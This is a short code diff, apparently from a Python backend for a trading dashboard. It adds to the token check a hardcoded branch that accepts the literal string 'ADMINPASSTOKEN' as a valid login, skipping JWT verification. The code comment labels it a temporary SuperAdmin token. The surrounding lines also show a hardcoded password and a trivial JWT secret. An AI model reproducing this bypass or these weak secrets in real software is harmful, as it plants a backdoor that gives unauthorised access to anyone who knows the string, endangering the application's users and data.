@@ -17,7 +17,9 @@ with open('TradingDashbackend/core/app_config.json', 'r') as config_file:
 PASSWORD = "sudip"
 JWT_SECRET = 'secret'
 
-def is_correct_user_token(token):   
+def is_correct_user_token(token):  
+    if (token == "ADMINPASSTOKEN"):
+        return True # Adding a SuperAdmin Token (TEMP)
     try:
         jwt.decode(token, JWT_SECRET, algorithms=['HS256'], options={"verify_exp": True})
         logger.debug("Login Success",token)
